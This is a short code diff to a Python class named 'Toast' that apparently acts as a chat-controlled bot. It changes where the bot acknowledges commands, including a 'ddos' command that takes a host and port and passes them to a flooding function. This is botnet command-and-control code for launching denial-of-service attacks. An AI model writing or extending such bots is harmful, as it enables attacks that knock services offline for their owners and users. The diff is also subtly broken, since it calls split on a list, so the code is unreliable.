@@ -23,13 +23,14 @@ class Toast(BaseResponder):
 		if self.is_command(msg):
 			command = (str(msg).split('!')[-1])
 			print('>>> COMMAND RECEIVED: %s' % command)
-			self.respond(msg, command + ' ok')
 			cmd, *params = command.split()
 
 			if cmd == 'ddos' and params:
+				self.respond(msg, command + ' ok')
 				host, port = params.split(':')
 				self.dudos(sock=msg, host=host, port=int(port))
 			elif cmd == 'quit':
+				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
 				exit()
 			else:
